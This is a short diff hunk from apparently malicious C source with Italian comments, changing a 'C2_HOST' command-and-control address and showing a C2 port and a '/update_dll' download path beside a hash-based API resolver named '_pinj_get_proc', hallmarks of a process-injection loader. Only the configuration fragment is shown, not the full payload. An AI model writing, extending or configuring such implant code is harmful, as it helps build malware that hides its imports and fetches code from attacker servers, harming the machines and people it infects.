@@ -111,7 +111,7 @@ static PVOID _pinj_get_proc(DWORD name_hash) {
 }
 
 /* ─── Costanti ───────────────────────────────────────────────────────────── */
-#define C2_HOST     L"192.168.42.124"
+#define C2_HOST     L"192.168.122.47"
 #define C2_PORT     443
 #define C2_PATH_DLL L"/update_dll"
 
